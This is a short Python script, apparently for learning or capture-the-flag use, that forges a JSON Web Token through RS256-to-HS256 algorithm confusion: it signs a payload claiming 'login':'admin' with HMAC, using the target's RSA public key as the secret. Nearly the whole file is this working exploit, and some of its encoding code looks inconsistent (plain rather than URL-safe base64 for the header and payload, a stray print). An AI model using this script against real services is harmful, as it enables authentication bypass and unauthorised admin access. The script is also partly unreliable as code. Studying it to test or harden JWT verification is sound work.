'''
This is purely for learning purpose and not intended to harm any organization,
person or product.
Code to generate an HMAC based JWT to send a manipulated jwt payload
given that the original jwt was RS256 and you have the public key for it.
Note: check once the generated base64 encodings. I observed
while decoding on terminal, that it does not encode `}`
'''
import base64
import hmac
import hashlib


with open('public.pem','r') as f:
    public = f.read()

header = '{"typ":"JWT","alg":"HS256"}'
payload = '{"login":"admin" }'

def encode_to_b64(message,padding=True):
    # message_bytes = message.encode('ascii')
    # b64_bytes = base64.b64encode(message_bytes)
    # b64_string = b64_bytes.decode('ascii')
    b64_string = base64.b64encode(bytes(message))
    if not padding: b64_string = b64_string.rstrip("=")
    print
    return b64_string

headerb64 = encode_to_b64(header,padding=False)
payloadb64 = encode_to_b64(payload,padding=False)
concatHeadPayload = headerb64+"."+payloadb64
print("encoded header and payload: "+headerb64+"."+payloadb64)

signature = base64.urlsafe_b64encode(hmac.new(key=public,msg=concatHeadPayload,digestmod=hashlib.sha256).digest()).decode('UTF-8').rstrip("=")
print(signature)

finalJwt = concatHeadPayload+"."+signature
print('final jwt: '+ finalJwt)